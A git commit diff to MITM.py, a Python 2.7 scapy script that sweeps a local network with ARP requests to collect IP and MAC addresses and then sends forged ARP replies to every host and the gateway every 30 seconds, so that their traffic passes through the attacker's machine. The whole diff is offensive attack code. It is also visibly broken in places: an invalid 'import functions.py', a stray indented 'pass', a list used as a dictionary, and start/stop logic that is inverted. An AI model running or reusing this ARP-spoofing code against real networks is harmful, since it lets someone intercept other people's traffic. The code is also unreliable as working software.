336b261ab36e2e99779e15bb366f6a25bc51e4a6
guykoy123 <guykoy123@gmail.com>
2017-10-29 15:53:57 +0200

    finished local address scanning and devided file into two separate ones

--- MITM.py
+++ MITM.py
@@ -1,84 +1,148 @@
 #python 2.7
 
 
-import wmi,logging,re
+import logging
 from threading import Thread
 from time import sleep
 from scapy.all import *
+from datetime import datetime
+import functions.py
 # except ImportError:
 #
 #     #TODO: handle all cases of missing modules and try to solve
 #     print 'a module is missing please check you have all required modules'
 
-def getLocalhostAddress():
+# global variables:
+stop=True
+localHost=[]
+localAddresses=[]
+prescanned_Packets=[]
+
+def add_packet(pkt):
     """
-    returns default gateway address,
-    Subnet Mask
-    and localhost IP address"""
-    l=[]
-    c = wmi.WMI() #create wmi object
-    for interface in c.Win32_NetworkAdapterConfiguration (IPEnabled=1):
-        return interface.DefaultIPGateway[0],interface.IPAddress[0],interface.MACAddress,interface.IPSubnet[0]
+    adds sniffed packets to list of prescanned packets
+    and sends it forward
+    """
+    if ARP not in pkt:
+        global prescanned_Packets
+        prescanned_Packets.append(pkt)
+
+    functions.sendPacket(pkt,localAddresses[0])
+
+
 
 def get_MAC_Address(pkt):
-    if ARP in pkt and pkt[ARP].op in (1,2): #who-has or is-at
-        return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")
+    if pkt[ARP].op == 2: # is-at
+        #if pkt[ARP].pdst==localHost[0]:
+        address=(pkt[ARP].psrc,pkt[ARP].hwsrc)
+        global localAddresses
+        if address not in localAddresses:
+            localAddresses.append(address)
+            print len(localAddresses)
 
 
-def getLocalAddrss(subnetMask,defaultGateway):
+def get_Local_Addresses(subnetMask,defaultGateway):
     """
-    returns a dictionary of all LAN IP addresses and their coresponding MAC address"""
+    monitors the network for new devices and updates the list
+    routinly scans all network
+    """
 
-
-    #TODO: get all local addresses
+    global localAddresses
+    lastHour=0
     #all possible ranges for networks
     low_IP_Range={'255.255.255.252':True,'255.255.255.248':True,'255.255.255.240':True,'255.255.255.224':True,'255.255.255.192':True,'255.255.255.128':True,'255.255.255.0':True}
-    if low_IP_Range[subnetMask]:
-        for i in range(int(subnetMask.split('.')[3]),255):
-            IP_Addr='.'.join(defaultGateway.split('.')[:2])+'.'+str(i) #construct IP address
-            packet=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1,pdst=IP_Addr)
-            pack=sendp(packet)
-            MAC_Addr=sniff(prn=get_MAC_Address, filter="arp", store=0).show()
-            print IP_Addr,MAC_Addr
+    while True:
+        if not stop:
+            currentHour=int(datetime.now().strftime('%H'))
+            if currentHour>lastHour: # if an hour passed, scan all possible IP addresses
+                if low_IP_Range[subnetMask]:
+                    for i in range(int(subnetMask.split('.')[3])+1,255):
+                        IP_Addr='.'.join(defaultGateway.split('.')[:3])+'.'+str(i) #construct IP address
+                        packet=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1,pdst=IP_Addr)
+                        sendp(packet) # send packet
+                        sniff(prn=get_MAC_Address, filter="arp", store=0, count=2,timeout=3) #sniff for response
 
-    else:
-        for i in range(int(subnetMask.split('.')[2]),255):
-            for j in range(int(subnetMask.split('.')[3]),255):
-                IP_Addr='.'.join(defaultGateway.split('.')[:1])+'.'+str(i)+'.'+str(j) #construct IP address
+                else:
+                    for i in range(int(subnetMask.split('.')[2])+1,255):
+                        for j in range(int(subnetMask.split('.')[3]),255):
+                            IP_Addr='.'.join(defaultGateway.split('.')[:2])+'.'+str(i)+'.'+str(j) #construct IP address
+                            packet=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1,pdst=IP_Addr)
+                            sendp(packet) # send packet
+                            sniff(prn=get_MAC_Address, filter="arp", store=0, count=2,timeout=3) #sniff for response
 
-    # allAddresses = subprocess.check_output(['arp', '-a'])
-    # temp=allAddresses.split('ff-ff-ff-ff-ff-ff')
-    # localAddrss=temp[0].split('\r\n')[3:-1]
-    # ipAddr=re.compile(r'\d+.\d+.\d+.\d+')
-    # macAddr=re.compile(r'([0-9A-Fa-f]{2}-){5}([0-9A-Fa-f]{2})')
-    # #created regex objects to extract IP and MAC
-    # localAddresses=dict()
-    # for i in localAddrss:
-    #     ip=ipAddr.search(i)
-    #     mac=macAddr.search(i)
-    #     localAddresses[ip.group()]=mac.group().replace('-',':')#format MAC address for scapy
-    #
-    # #return dict of IP and MAC on LAN
-    # return localAddresses
+                if currentHour==12:# update lastHour
+                    lastHour=0
+                else:
+                    lastHour=currentHour
 
-def arpSpoof(localAddresses,defaultGateway,localMAC):
+            sniff(prn=get_MAC_Address, filter="arp", store=0) #sniff for new devices
+
+
+def arpSpoof(defaultGateway,localMAC):
     """
-    every 30 seconds send ARP broadcast to spoof all machines on LAN"""
+    every 30 seconds send ARP broadcast to spoof all machines on LAN
+    """
 
     while True:
-        for ip in localAddresses.keys():
-            if ip != defaultGateway:
-                #create arp packets
-                victimPacket = Ether(src=localMAC,dst=localAddresses[ip])/ARP(op=2, hwsrc=localMAC,psrc = defaultGateway, pdst=ip, hwdst = localAddresses[ip])
-                #victimPacket.show()
-                gatewayPacket=Ether(dst=localAddresses[defaultGateway],src=localMAC)/ARP(op=2,hwsrc=localMAC,psrc=ip,hwdst=localAddresses[defaultGateway],pdst=defaultGateway)
-                #gatewayPacket.show()
+        if len(localAddresses)>0:
+            for ip in localAddresses.keys()[1:]: #run through all addresses except the default gateway
+                if ip != defaultGateway:
 
-                #send packets
-                sendp(victimPacket)
-                sendp(gatewayPacket)
-        sleep(30)
+                    #create arp packets
+                    victimPacket = Ether(src=localMAC,dst=localAddresses[ip])/ARP(op=2, hwsrc=localMAC,psrc = defaultGateway, pdst=ip, hwdst = localAddresses[ip])
+                    #victimPacket.show()
+                    gatewayPacket=Ether(dst=localAddresses[defaultGateway],src=localMAC)/ARP(op=2,hwsrc=localMAC,psrc=ip,hwdst=localAddresses[defaultGateway],pdst=defaultGateway)
+                    #gatewayPacket.show()
 
+                    #send packets
+                    sendp(victimPacket)
+                    sendp(gatewayPacket)
+            sleep(30)
+
+def manager():
+    """
+    listens for user commands and executes them
+    """
+    #TODO: fully flesh out all possible commands
+    commands={'start':False,'stop':True}
+    while True:
+        command=input('Please type a command')
+        if commands[command]:
+            global stop
+            stop=True
+            if len(localAddresses)>0:
+                print 'resuming operation'
+                logging.debug('resuming operation')
+                    pass
+            else:
+                print 'scanning network'
+                logging.debug('scanning network')
+
+        elif commands[command]:
+            global stop
+            stop=False
+            print 'operation stopped'
+            logging.debug('operation stopped')
+
+def setup():
+    """
+    get all necessary values for the program to run
+    and start all threads
+    """
+    global localHost
+    #get default gateway and local IP address
+    defaultGateway,subnetMask,localHost=functions.getLocalhostAddress()
+    logging.debug('got default gateway, local IP, local MAC and Subnet Mask')
+
+    monitorThread=Thread(target=get_Local_Addresses)
+    #monitorThread.start()
+    logging.debug('created thread for monitoring network for new devices')
+
+    arpThread=Thread(target=arpSpoof,args=(defaultGateway,localHost[1],))
+    #arpThread.start()
+    logging.debug('created thread for ARP spoofing')
+
+    return defaultGateway,subnetMask
 
 
 def main():
@@ -87,34 +151,20 @@ def main():
     gets the parameters for working
     then calls all functions in order
     """
-
     #setup logging to file logFile.txt
-    logging.basicConfig(filename='logFile.txt',level=logging.DEBUG, format=' %(asctime)s - %(levelname)s - %(message)s')
+    logging.basicConfig(filename='logFile.txt',level=logging.DEBUG, format='%(lineno)s - %(levelname)s : %(message)s')
     logging.info('\n\n\n\n\n########## Program Start ##########\n\n')
 
-    #get default gateway and local IP address
-    defaultGateway,localIP,localMAC,subnetMask=getLocalhostAddress()
-    logging.debug('got default gateway, local IP, local MAC and Subnet Mask')
+    managerThread=Thread(target=manager) #checks if user wants to stop
+    managerThread.start()
+    logging.debug('created thread for managing')
 
-    #create a dictionary of local IP addresses and MAC addresses
-    localAddresses=getLocalAddrss(subnetMask,defaultGateway)
-    logging.debug('created dictionary with all IP and MAC addresses on LAN')
+    if not stop:
+        defaultGateway,subnetMask=setup() # get all necessary values before beginning
 
-    arpThread=Thread(target=arpSpoof,args=(localAddresses,defaultGateway,localMAC,))
-    #arpThread.start()
-    logging.debug('created thread for ARP spoofing')
+    while not stop: #main loop
+        sniff(prn=add_packet,count=5) #listen for packets
 
-    while True: #main loop
-
-        #TODO:check if user wants to stop
-        #TODO:listen for packets
-        #TODO:save packet
-        #TODO:send packet to router
-        #TODO:listen to response from router
-        #TODO:save response
-        #TODO:send packet to original host
-        #TODO:save packets to file
-        break
 
 
 
